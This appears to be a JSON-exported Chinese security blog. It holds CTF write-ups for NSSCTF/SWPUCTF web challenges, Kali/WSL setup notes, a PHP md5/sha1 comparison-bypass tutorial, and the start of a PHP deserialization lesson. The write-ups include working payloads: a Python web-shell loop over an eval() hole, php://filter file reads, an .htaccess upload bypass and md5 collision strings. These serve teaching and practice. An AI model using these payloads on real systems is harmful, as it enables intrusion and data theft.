text} response = session.post(submit_url, data=payload) with open('response_text/你能在一秒钟打出八句英文吗.html', 'w', encoding='utf-8') as f: f.write(response.text) print('Success') 复读机 输入 {{1+1}} 输出 2，判断存在模板注入\nhttps://github.com/Puppy1599/picx-images-hosting/raw/master/Typora/networkSecurity/PixPin_2025-05-16_23-23-55.wis6ehwd3.webp\n尝试使用焚靖绕过，获得 flag\nhttps://github.com/Puppy1599/picx-images-hosting/raw/master/Typora/networkSecurity/PixPin_2025-05-16_23-26-08.1vyvjkncih.webp","遗失的拉链#遗失的拉链":""},"title":"Week2 Web 网络攻防"},"/blog/ctf-write-up/nisactf-2022easyssrf/":{"data":{"":"尝试使用 file:///flag 读取 /flag，提示： 都说了这里看不了flag。。但是可以看看提示文件：/fl4g\n使用 file:///fl4g 读取 /fl4g\n提示： file:///fl4g 的快照如下：你应该看看除了index.php，是不是还有个ha1x1ux1u.php\n访问 http://node7.anna.nssctf.cn:21941/\n\u003c?php highlight_file(__FILE__); error_reporting(0); $file = $_GET[\"file\"]; if (stristr($file, \"file\")){ die(\"你败了.\"); } //flag in /flag echo file_get_contents($file); 根据提示 flag in /flag，利用任意文件读取漏洞 ha1x1ux1u.php?file=/flag 读取 /flag\n获得 flag：NSSCTF{b18d9345-b262-4732-bda8-67d380c9e2ee}"},"title":"[NISACTF 2022]easyssrf"},"/blog/ctf-write-up/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasy_md5/":{"data":{"":"绕过原理：md5 与 sha1 绕过\n\u003c?php highlight_file(__FILE__); include 'flag2.php'; if (isset($_GET['name']) \u0026\u0026 isset($_POST['password'])){ $name = $_GET['name']; $password = $_POST['password']; if ($name != $password \u0026\u0026 md5($name) == md5($password)){ echo $flag; } else { echo \"wrong!\"; } } else { echo 'wrong!'; } ?\u003e 方法：数组比较\n获得 flag：NSSCTF{f112765f-2a34-48ee-b7c6-f18f7cc42671}"},"title":"[SWPUCTF 2021 新生赛]easy_md5"},"/blog/ctf-write-up/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyrce/":{"data":{"":"存在 RCE 漏洞：eval($_GET['url']);\n\u003c?php error_reporting(0); highlight_file(__FILE__); if(isset($_GET['url'])) { eval($_GET['url']); } ?\u003e 构造 Web Shell\nimport requests url = 'http://node5.anna.nssctf.cn:27625/' while True: cmd = input('\u003e ') if cmd == 'quit': break payload = {'url': f'echo `{cmd}`;'} response = requests.get(url, params=payload) print(response.text) 列出 / 的所有文件\n\u003e ls / \u003ccode\u003e\u003cspan style=\"color: #000000\"\u003e \u003cbr /\u003e\u003c/span\u003e\u003cspan style=\"color: #0000BB\"\u003e?\u0026gt;\u003c/span\u003e \u003c/span\u003e \u003c/code\u003ebin boot dev etc flllllaaaaaaggggggg home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var 输出 /flllllaaaaaaggggggg 的内容\n\u003e cat /flllllaaaaaaggggggg \u003ccode\u003e\u003cspan style=\"color: #000000\"\u003e \u003cbr /\u003e\u003c/span\u003e\u003cspan style=\"color: #0000BB\"\u003e?\u0026gt;\u003c/span\u003e \u003c/span\u003e \u003c/code\u003eNSSCTF{9e548da1-17a3-4796-9c5a-4a01febefd98} \u003e quit "},"title":"[SWPUCTF 2021 新生赛]easyrce"},"/blog/ctf-write-up/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload1.0/":{"data":{"":"上传 fish1.php 失败，但可以抓到包，判断为 服务端检查\n上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀\n./upload/fish.jpg succesfully uploaded! 上传任意后缀文件 fish.fish 失败，判断为 白名单\n想啥呢！ 尝试 MIME 绕过，上传 fish1.php 成功\n./upload/fish1.php succesfully uploaded! 使用蚁剑进行连接\nfind / -iname flag 没有找到文件，新建 phpinfo.php 找到了 flag"},"title":"[SWPUCTF 2021 新生赛]easyupload1"},"/blog/ctf-write-up/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload3.0/":{"data":{"":"上传 fish1.php 失败，但可以抓到包，判断为 服务端检查\n上传非图片内容、图片后缀的文件 fish.jpg 成功，判断为 检查后缀\n./upload/fish.jpg succesfully uploaded! 上传任意后缀文件 fish.fish 成功，判断为 黑名单\n./upload/fish.fish succesfully uploaded! 尝试上传特殊可解析后缀文件 fish.php5 失败\n你难道想传个🐎某？ 尝试上传 .htaccess 成功\n.htaccess\u003cFilesMatch \"fish.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e ./upload/.htaccess succesfully uploaded! 使用蚁剑进行连接\n在 /var/www/html/flag.php 找到 flag\n\u003c?php $flag = 'NSSCTF{2df0fb52-5c72-4f35-a3f3-e70bd06e8416}'; ?\u003e "},"title":"[SWPUCTF 2021 新生赛]easyupload3"},"/blog/ctf-write-up/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Binclude/":{"data":{"":"提示： 传入一个file试试\n根据提示传入 GET 参数 ?file=，存在任意文件包含漏洞：include_once($file);\n\u003c?php ini_set(\"allow_url_include\",\"on\"); header(\"Content-type: text/html; charset=utf-8\"); error_reporting(0); $file=$_GET['file']; if(isset($file)){ show_source(__FILE__); echo 'flag 在flag.php中'; }else{ echo \"传入一个file试试\"; } echo \"\u003c/br\u003e\"; echo \"\u003c/br\u003e\"; echo \"\u003c/br\u003e\"; echo \"\u003c/br\u003e\"; echo \"\u003c/br\u003e\"; include_once($file); ?\u003e flag 在flag.php中 提示： flag 在flag.php中\n利用 PHP 伪协议读取 flag.php 的文件源码\n/?file=php://filter/read=convert.base64-encode/resource=flag.php 对 base64 编码的 flag.php 进行解码\nPD9waHANCiRmbGFnPSdOU1NDVEZ7MWJmNDE3YTctY2NjMy00NjkyLTk5OWQtNjMzNjhjODEyZjU1fSc7 \u003c?php $flag='NSSCTF{1bf417a7-ccc3-4692-999d-63368c812f55}'; "},"title":"[SWPUCTF 2021 新生赛]include"},"/blog/ctf-write-up/swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpseudoprotocols/":{"data":{"":"提示： hint is hear Can you find out the hint.php?\n根据提示，利用任意文件包含漏洞和 PHP 伪协议读取 hint.php 的文件源码\n?wllm=php://filter/read=convert.base64-encode/resource=hint.php 对 base64 编码的 hint.php 进行解码\nPD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4= \u003c?php //go to /test2222222222222.php ?\u003e 根据提示访问 http://node7.anna.nssctf.cn:24948/test2222222222222.php\n\u003c?php ini_set(\"max_execution_time\", \"180\"); show_source(__FILE__); include('flag.php'); $a= $_GET[\"a\"]; if(isset($a)\u0026\u0026(file_get_contents($a,'r')) === 'I want flag'){ echo \"success\\n\"; echo $flag; } ?\u003e 当读取文件 $a 的内容为 I want flag 时会输出 $flag，利用 PHP 伪协议绕过\nhttp://node7.anna.nssctf.cn:24948/test2222222222222.php?a=php://input POST 请求正文： I want flag Error\n根据 test2222222222222.php 的内容判断 $flag 定义在 flag.php 中，由于 index.php 中存在任意文件包含漏洞，尝试使用 ?wllm=php://filter/read=convert.base64-encode/resource=flag.php 读取 flag.php 的文件源码，输出 hacker!，尝试失败。"},"title":"[SWPUCTF 2021 新生赛]PseudoProtocols"},"/blog/debian-linux/":{"data":{"":" 即将更新：目录结构"},"title":"Debian Linux"},"/blog/debian-linux/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/":{"data":{"":"","#":"一、更改软件仓库镜像源 以 TUNA 清华源为例：Kali 软件仓库使用帮助\n1、在终端中执行命令，使用 vim 编辑器编辑 sources.list 文件\nsudo vim /etc/apt/sources.list 2、使用 # 注释 Kali 官方的镜像源并添加清华源\n# deb http://http.Kali.org/kali kali-rolling main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib non-free-firmware deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib non-free-firmware Note\n以下为更换软件仓库镜像源涉及到的一些问题，可选择性观看。\n为什么要换源 Kali 使用 apt 命令安装软件包时会在软件仓库的镜像源中查找并下载安装，但默认的 Kali 官方源服务器位于国外，国内用户直接访问可能速度较慢，甚至出现安装失败的情况，因此需要更换国内镜像源（如清华源）加快软件下载和更新速度 为什么配镜像源有 deb 和 deb-src deb：指定二进制软件包的下载地址 deb-src：指定源代码包的下载地址 普通用户如果只是安装软件而无需源码，就可以禁用 deb-src 甚至删除 deb-src 行以节省 apt update 时间，如果需要阅读某个软件的源代码、重新编译软件或调试程序等就需要启用 deb-src 下载源码\n为什么 /etc/apt 有 sources.list 和 sources.list.d sources.list：主配置文件，存放系统默认的软件仓库地址（如官方源、第三方源等） sources.list.d：附加配置文件目录，用于存放额外的软件源配置文件（通常以 .list 结尾），不同的软件或第三方源可以单独存放一个文件，避免混在 sources.list 里 Docker 的源可能存放在 /etc/apt/sources.list.d/docker.list Google Chrome 的源可能存放在 /etc/apt/sources.list.d/google-chrome.list 二、网络配置 1、查看当前网络连接\nnmcli connection show NAME：接口名称 TYPE：类型 ethernet：以太网 loopback：回环 DEVICE：设备（网卡名） 记下需要修改网络配置的接口名称（NAME）\n┌──(hailo㉿kali-Hailo)-[~] └─$ sudo nmcli connection show NAME UUID TYPE DEVICE Wired connection 1 56d99757-efc2-4ee2-8887-ab710c94094f ethernet eth0 lo b9fa5e22-368b-450b-9928-a65db44b61f5 loopback lo 2、修改网络配置\nNAME：网络接口名称 ipv4.addresses：IP 地址 / 子网掩码 ipv4.gateway：默认网关 ipv4.dns：DNS 地址（可以只填主 DNS 地址，若有二级 DNS，使用 , 进行分隔） 腾讯云 DNSPod Public DNS：119.29.29.29 阿里云公共 DNS：223.5.5.5 ipv4.method：网络配置方式 manual：手动，即配置静态 IP 地址（static） auto：自动，即使用 DHCP 配置动态 IP 地址（dynamic） 配置静态 IP 地址：\nsudo nmcli connection modify \"NAME\" ipv4.addresses \"ADDRESS/NETMASK\" ipv4.gateway \"GATEWAY\" ipv4.dns \"DNS_ADDRESS,DNS_ADDRESS\" ipv4.method manual ┌──(hailo㉿kali-Hailo)-[~] └─$ sudo nmcli connection modify \"Wired connection 1\" ipv4.addresses \"192.168.50.20/24\" ipv4.gateway \"192.168.50.2\" ipv4.dns \"119.29.29.29,223.5.5.5\" ipv4.method manual 配置动态 IP 地址：\nsudo nmcli connection modify \"NAME\" ipv4.method auto ┌──(hailo㉿kali-Hailo)-[~] └─$ sudo nmcli connection modify \"Wired connection 1\" ipv4.method auto 3、重启网络服务使配置生效\nsudo systemctl restart NetworkManager 4、查看网络设备信息\nifconfig ┌──(hailo㉿kali-Hailo)-[~] └─$ ifconfig eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 192.168.50.133 netmask 255.255.255.0 broadcast 192.168.50.255 inet6 fe80::20c:29ff:fe13:bcaa prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:0c:29:13:bc:aa txqueuelen 1000 (Ethernet) RX packets 995 bytes 74368 (72.6 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 242 bytes 68252 (66.6 KiB) TX errors 0 dropped 6 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 16 bytes 1128 (1.1 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 16 bytes 1128 (1.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ┌──(hailo㉿kali-Hailo)-[~] └─$ ifconfig eth0: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 192.168.50.20 netmask 255.255.255.0 broadcast 192.168.50.255 inet6 fe80::20c:29ff:fe13:bcaa prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:0c:29:13:bc:aa txqueuelen 1000 (Ethernet) RX packets 995 bytes 74368 (72.6 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 292 bytes 81522 (79.6 KiB) TX errors 0 dropped 6 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 16 bytes 1128 (1.1 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 16 bytes 1128 (1.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 "},"title":"系统配置"},"/blog/debian-linux/%E7%BB%88%E7%AB%AF%E5%91%BD%E4%BB%A4/":{"data":{"":"","apt#apt":"","find#find":"apt 1、更新软件包列表\nsudo apt update Note\n仅同步本地软件包索引与配置的软件源中的最新信息，但不会实际安装或升级任何软件。\n2、升级软件包\n仅升级当前已安装的软件包，不会主动安装新依赖或删除旧包，适合日常维护，避免因依赖变化而导致系统不稳定。\nsudo apt upgrade 不仅会升级软件包，还会自动处理依赖关系（安装新依赖或删除冲突的旧包），适合大版本升级，解决复杂的依赖调整。\nsudo apt full-upgrade 3、安装指定的软件包\nsudo apt install \u003cpackage_name\u003e 4、移除软件包\n移除指定软件包但保留其配置文件\nsudo apt remove \u003cpackage_name\u003e 完全移除软件包及其配置文件\nsudo apt purge \u003cpackage_name\u003e 自动移除那些被安装作为其他软件包的依赖项，但现在不再被任何已安装软件包所需的软件包\nsudo apt autoremove 在已配置的软件源中搜索包含指定关键词的软件包\nsudo apt search \u003ckeyword\u003e which 查找并显示命令的绝对路径\nwhich \u003ccommand_name\u003e tar 选项 作用 备注 -c 创建一个新的归档 仅打包，不压缩 -v 详细地列出处理的文件 -f 指定归档文件的名称 最后一个参数，后面只能接档案名 -x 从归档中解出文件 -z 使用 gzip 压缩归档 -t 列出归档内容 -C 目标目录 1、查看 tar 归档内的文件\ntar -tvf \u003cfilename.tar\u003e 2、创建一个新的 tar 归档\ntar -cvf \u003cfilename.tar\u003e \u003cfile1\u003e \u003cfile2\u003e ... 3、解出 tar 归档内容到指定目录\ntar -xvf \u003cfilname.tar\u003e -C \u003cdirectory\u003e 4、查看 tar.gz 包内的文件\ntar -ztvf \u003cfilename.tar.gz\u003e 5、创建一个新的 tar.gz 压缩包\ntar -zcvf \u003cfilname.tar.gz\u003e \u003cfile1\u003e \u003cfile2\u003e ... 6、解压 tar.gz 到指定目录\ntar -zxvf \u003cfilename.tar.gz\u003e -C \u003cdirectory\u003e find 1、在指定目录下按文件名查找文件\nfind \u003cdirectory\u003e -name \u003cfilename\u003e 2、在指定目录下按文件名（忽略大小写）查找文件\nfind \u003cdirectory\u003e -iname \u003cfilename\u003e ","tar#tar":"","which#which":""},"title":"终端命令"},"/blog/debian-linux/wsl2-%E5%AE%89%E8%A3%85-kali-linux/":{"data":{"":"","一启用-windows-功能#一、启用 Windows 功能":"","三安装-gui-桌面#三、安装 GUI 桌面":"","二安装-kali-linux#二、安装 Kali Linux":"","四启动-kali-linux-win-kex#四、启动 Kali Linux Win-KeX":"一、启用 Windows 功能 Hyper-V Virtual Machine Platform 适用于 Linux 的 Windows 子系统 二、安装 Kali Linux 查看可用发行版列表：wsl --list --online\nC:\\Users\\puppy\u003ewsl --list --online 以下是可安装的有效分发的列表。 使用 'wsl.exe --install \u003cDistro\u003e' 安装。 NAME FRIENDLY NAME AlmaLinux-8 AlmaLinux OS 8 AlmaLinux-9 AlmaLinux OS 9 AlmaLinux-Kitten-10 AlmaLinux OS Kitten 10 Debian Debian GNU/Linux FedoraLinux-42 Fedora Linux 42 SUSE-Linux-Enterprise-15-SP5 SUSE Linux Enterprise 15 SP5 SUSE-Linux-Enterprise-15-SP6 SUSE Linux Enterprise 15 SP6 Ubuntu Ubuntu Ubuntu-24.04 Ubuntu 24.04 LTS archlinux Arch Linux kali-linux Kali Linux Rolling openSUSE-Tumbleweed openSUSE Tumbleweed openSUSE-Leap-15.6 openSUSE Leap 15.6 Ubuntu-18.04 Ubuntu 18.04 LTS Ubuntu-20.04 Ubuntu 20.04 LTS Ubuntu-22.04 Ubuntu 22.04 LTS OracleLinux_7_9 Oracle Linux 7.9 OracleLinux_8_7 Oracle Linux 8.7 OracleLinux_9_1 Oracle Linux 9.1 安装 kali-linux：wsl --install -d kali-linux\nC:\\Users\\puppy\u003ewsl --install kali-linux 正在下载: Kali Linux Rolling 正在安装: Kali Linux Rolling 已成功安装分发。它可通过 “wsl.exe -d kali-linux” 启动 启动 kali-linux：wsl.exe -d kali-linux 或直接在开始菜单打开 kali-linux\n创建用户：输入用户名和密码\nWaiting for systemd to start... running Please create a default Kali WSL user. The username does not need to match your Windows username. For more information visit: https://aka.ms/wslusers Enter new UNIX username: hailo New password: Retype new password: passwd: password updated successfully ┏━(Message from Kali developers) ┃ ┃ This is a minimal installation of Kali Linux, you likely ┃ want to install supplementary tools. Learn how: ┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/ ┃ ┗━(Run: “touch ~/.hushlogin” to hide this message) ┌──(hailo㉿HAILO-LAPTOP)-[~] └─$ 三、安装 GUI 桌面 Win-KeX 为 Windows Subsystem for Linux (WSL 2) 中的 Kali Linux 提供了 GUI 桌面体验\n1、更改软件仓库镜像源 在终端中执行命令，使用 vim 编辑器编辑 sources.list 文件\nsudo vim /etc/apt/sources.list 使用 # 注释 Kali 官方的镜像源并添加清华源\n# deb http://http.Kali.org/kali kali-rolling main contrib non-free non-free-firmware deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib non-free-firmware deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib non-free-firmware 2、更新软件包列表 sudo apt update 3、安装 Win-KeX sudo apt install -y kali-win-kex 四、启动 Kali Linux Win-KeX 以无缝模式启动具有声音支持的 Win-KeX，其它模式请参考官方文档\nwsl -d kali-linux kex --sl -s "},"title":"WSL2 安装 Kali Linux"},"/blog/php/md5-%E4%B8%8E-sha1-%E7%BB%95%E8%BF%87/":{"data":{"":"","1md5-宽松比较绕过#1、md5 宽松比较绕过":"","2md5-严格比较绕过#2、md5 严格比较绕过":"","3md5-字符串比较绕过#3、md5 字符串比较绕过":"","4sha1-数组比较绕过#4、sha1 数组比较绕过":"","5总结#5、总结":"1、md5 宽松比较绕过 方法：0e 比较\n以 0e 开头的字符串在 PHP 中会被视为浮点数 0（科学计数法），如果 md5 编码后的哈希值是以 0e 开头的，就会被 PHP 解析为 0，当两个不同的值经过 md5 编码后都以 0e 开头而解析为 0 时，== 就会认为相等\n\u003c?php highlight_file(__FILE__); $flag = 'flag{this is a flag}'; if (isset($_GET['a']) \u0026\u0026 isset($_GET['b'])){ $a = $_GET['a']; $b = $_GET['b']; if ($a != $b \u0026\u0026 md5($a) == md5($b)){ echo $flag; } else { echo \"wrong!\"; } } ?\u003e md5 常见的以 0e 开头的值：\n字符串 md5 值 240610708 0e462097431906509019562988736854 314282422 0e990995504821699494520356953734 571579406 0e972379832854295224118025748221 903251147 0e174510503823932942361353209384 QLTHNDT 0e405967825401955372549139051580 QNKCDZO 0e830400451993494058024219903391 EEIZDOI 0e782601363539291779881938479162 TUFEPMC 0e839407194569345277863905212547 2、md5 严格比较绕过 Error\n在宽松比较（==）时，PHP 会自动进行类型转换，而严格比较（===）不会进行任何类型转换，即 0e 开头的字符串不会被以科学计数法解析为 0，PHP 会直接比较字符串是否相同，因此无法通过 0e 比较 的方式绕过\n方法：数组比较（PHP \u003c 8.0.0）\n在 PHP 中，md5() 和 sha1() 等哈希函数是专门设计来处理字符串的，传入数组时会报错并返回 NULL，当两个不同的数组经过 md5 编码后会报错但都会返回 NULL，=== 就会认为相等\nWarning: md5() expects parameter 1 to be string, array given in C:\\phpStudy\\WWW\\php\\md5\\md5_2.php on line 10 \u003c?php highlight_file(__FILE__); $flag = 'flag{this is a flag}'; if (isset($_GET['a']) \u0026\u0026 isset($_GET['b'])){ $a = $_GET['a']; $b = $_GET['b']; if ($a != $b \u0026\u0026 md5($a) === md5($b)){ echo $flag; } else { echo \"wrong!\"; } } ?\u003e 3、md5 字符串比较绕过 Error\n当只能传入字符串或 PHP \u003e= 8.0.0 时，无法通过 0e 比较 和 数组比较 的方式绕过\n方法：哈希碰撞\n生成两个 md5 相同但内容完全不一样的字符串\n\u003c?php highlight_file(__FILE__); $flag = 'flag{this is a flag}'; if (isset($_GET['a']) \u0026\u0026 isset($_GET['b'])){ $a = $_GET['a']; $b = $_GET['b']; if ((string)$a != (string)$b \u0026\u0026 md5($a) === md5($b)){ echo $flag; } else { echo \"wrong!\"; } } ?\u003e 1、使用 fastcoll 生成两个 md5 相同但内容完全不一样的文件\nC:\\Users\\puppy\\Desktop\\fastcoll\u003efastcoll_v1.0.0.5.exe -p input.txt -o output1.txt output2.txt MD5 collision generator v1.5 by Marc Stevens (http://www.win.tue.nl/hashclash/) Using output filenames: 'output1.txt' and 'output2.txt' Using prefixfile: 'input.txt' Using initial value: afb4f79efa0c73c3ff9cc897951da3fe Generating first block: ..... Generating second block: S11............... Running time: 1.239 s 2、以十六进制查看两个文件的内容\n┌──(hailo㉿HAILO-LAPTOP)-[~/md5collision] └─$ xxd output1.txt 00000000: 6861 696c 6f00 0000 0000 0000 0000 0000 hailo........... 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000030: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000040: 1aae 2ab5 f640 bc61 9d96 15e7 6463 9e2e ..*..@.a....dc.. 00000050: 6eb8 493f 1bc4 a5e7 2a3a 7acd 138a b7e2 n.I?....*:z..... 00000060: 70e5 f2c9 ccab ef35 c73b 6979 df5b 552a p......5.;iy.[U* 00000070: a8bc 9c5d 63fc ed67 ef6f b38b 2d7d a14a ...]c..g.o..-}.J 00000080: bb02 a7aa 8e2c 9e27 814d 73bc c33e d457 .....,.'.Ms..\u003e.W 00000090: a04a a2f5 11ba 6022 d5b7 f7cc 5029 5d22 .J....`\"....P)]\" 000000a0: b586 dff6 3c29 9f36 87a3 a4ef e615 76e6 ....\u003c).6......v. 000000b0: bcae 7117 662b b617 314e e86c f425 3e4a ..q.f+..1N.l.%\u003eJ ┌──(hailo㉿HAILO-LAPTOP)-[~/md5collision] └─$ xxd output2.txt 00000000: 6861 696c 6f00 0000 0000 0000 0000 0000 hailo........... 00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000020: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000030: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000040: 1aae 2ab5 f640 bc61 9d96 15e7 6463 9e2e ..*..@.a....dc.. 00000050: 6eb8 49bf 1bc4 a5e7 2a3a 7acd 138a b7e2 n.I.....*:z..... 00000060: 70e5 f2c9 ccab ef35 c73b 6979 dfdb 552a p......5.;iy..U* 00000070: a8bc 9c5d 63fc ed67 ef6f b30b 2d7d a14a ...]c..g.o..-}.J 00000080: bb02 a7aa 8e2c 9e27 814d 73bc c33e d457 .....,.'.Ms..\u003e.W 00000090: a04a a275 11ba 6022 d5b7 f7cc 5029 5d22 .J.u..`\"....P)]\" 000000a0: b586 dff6 3c29 9f36 87a3 a4ef e695 75e6 ....\u003c).6......u. 000000b0: bcae 7117 662b b617 314e e8ec f425 3e4a ..q.f+..1N...%\u003eJ 3、对两个文件内容进行 url 编码\nPS C:\\Users\\puppy\\Desktop\u003e python file_md5_url_encode.py \"C:\\Users\\puppy\\Desktop\\fastcoll\\output1.txt\" 文件的 MD5 值是: 7b31d56dd86166359ed55e1c3e4809ff 文件的 URL 编码内容是： hailo%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%D9%D41%96%E1%A5%7F%10W%ABt%23%A6~%05%94%C6%15OP%19%FAz%3C%1E%406%E8%3B%3D%FD%E5%F1%F9%BE%80%E4A%A6k%FC%F1%F4%CE%AD+%CE%1BK%CC%7D%87%BB%85%CF%E6AN%5B%EB%D6%F5Z1m9X%86%CFa%2B%B0%03%7C%FF%FD%C8e%F4El6%40%27%CD%99%AAt-%04LO%60%CDA-%C2%C8%A9%02%CC%AB6%EB%96%EB%D0%1B%7CJ%E1%A2%8D%9D%DF%D4~%F2%1F%84j%FF-%AF8q%40 PS C:\\Users\\puppy\\Desktop\u003e python file_md5_url_encode.py \"C:\\Users\\puppy\\Desktop\\fastcoll\\output2.txt\" 文件的 MD5 值是: 7b31d56dd86166359ed55e1c3e4809ff 文件的 URL 编码内容是： hailo%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%D9%D41%96%E1%A5%7F%10W%ABt%23%A6~%05%94%C6%15%CFP%19%FAz%3C%1E%406%E8%3B%3D%FD%E5%F1%F9%BE%80%E4A%A6k%FC%F1%F4%CE-%21%CE%1BK%CC%7D%87%BB%85%CF%E6AN%DB%EB%D6%F5Z1m9X%86%CFa%2B%B0%03%7C%FF%FD%C8e%F4El6%C0%27%CD%99%AAt-%04LO%60%CDA-%C2%C8%A9%02%CC%AB6%EB%96%EB%D0%1B%FCI%E1%A2%8D%9D%DF%D4~%F2%1F%84j%FF%AD%AF8q%40 str1hailo%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%D9%D41%96%E1%A5%7F%10W%ABt%23%A6~%05%94%C6%15OP%19%FAz%3C%1E%406%E8%3B%3D%FD%E5%F1%F9%BE%80%E4A%A6k%FC%F1%F4%CE%AD+%CE%1BK%CC%7D%87%BB%85%CF%E6AN%5B%EB%D6%F5Z1m9X%86%CFa%2B%B0%03%7C%FF%FD%C8e%F4El6%40%27%CD%99%AAt-%04LO%60%CDA-%C2%C8%A9%02%CC%AB6%EB%96%EB%D0%1B%7CJ%E1%A2%8D%9D%DF%D4~%F2%1F%84j%FF-%AF8q%40 str2hailo%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%17%D9%D41%96%E1%A5%7F%10W%ABt%23%A6~%05%94%C6%15%CFP%19%FAz%3C%1E%406%E8%3B%3D%FD%E5%F1%F9%BE%80%E4A%A6k%FC%F1%F4%CE-%21%CE%1BK%CC%7D%87%BB%85%CF%E6AN%DB%EB%D6%F5Z1m9X%86%CFa%2B%B0%03%7C%FF%FD%C8e%F4El6%C0%27%CD%99%AAt-%04LO%60%CDA-%C2%C8%A9%02%CC%AB6%EB%96%EB%D0%1B%FCI%E1%A2%8D%9D%DF%D4~%F2%1F%84j%FF%AD%AF8q%40 4、sha1 数组比较绕过 方法：数组比较\n在 PHP 中，md5() 和 sha1() 等哈希函数是专门设计来处理字符串的，传入数组时会报错并返回 NULL，当两个不同的数组经过 md5 或 sha1 编码后会报错但都会返回 NULL，=== 就会认为相等\n\u003c?php highlight_file(__FILE__); $flag = 'flag{this is a flag}'; if (isset($_GET['a']) \u0026\u0026 isset($_GET['b'])){ $a = $_GET['a']; $b = $_GET['b']; if ($a != $b \u0026\u0026 md5($a) === sha1($b)){ echo $flag; } else { echo \"wrong!\"; } } ?\u003e 5、总结 类型 方法 md5 宽松比较绕过 0e 比较、数组比较、哈希碰撞 md5 严格比较绕过 数组比较、哈希碰撞 md5 字符串比较绕过 哈希碰撞 sha1 数组比较绕过 数组比较 "},"title":"Md5 与 Sha1 绕过"},"/blog/php/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/":{"data":{"":"","一靶场部署#一、靶场部署":"","三类与对象#三、类与对象":"","二面向对向基本概念#二、面向对向基本概念":"","四序列化基础知识#四、序列化基础知识":"一、靶场部署 项目地址：php_ser_Class\nNotice\n作者推荐使用 Docker 的方式部署环境，这里以 phpstudy 的方式部署\n1、直接将项目文件复制到 phpstudy 的网站根目录\n2、访问 php_ser_Class 靶场目录\n二、面向对向基本概念 面向过程\n面向过程是一种以整体事件为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。\n面向对象\n面向对象是一种以对象为中心的编程思想, 把要解决的问题分解成各个对象;对象是一个由信息及对信息进行处理的描述所组成的整体, 是对现实世界的抽象。\n对象的三个特征：对象的行为、对象的形态、对象的表示\n类的定义：类定义了一件事物的抽象特点，它将数据以及对这些数据的操作封装在一起。对象是具有类类型的变量，是对类的实例。\n内部构成：成员属性 + 成员方法\n成员属性：定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可成为对象的属性。\n成员方法：定义在类的内部，可用于访问对象的数据\n继承：继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础上进行，把一个己经存在的类所定义的内容作为自己的内容，并加入若干新的内容。\n父类：一个类被其它类继承，可将该类称为父类、基类或超类。\n子类：一个类继承其它类，可将该类称为子类或派生类。\n三、类与对象 1、类的结构 类：定义类名、成员属性、成员方法\n\u003c?php class Class_Name{ // 成员属性声明 // 成员方法声明 } 2、类的内容 创建一个类：\n\u003c?php // 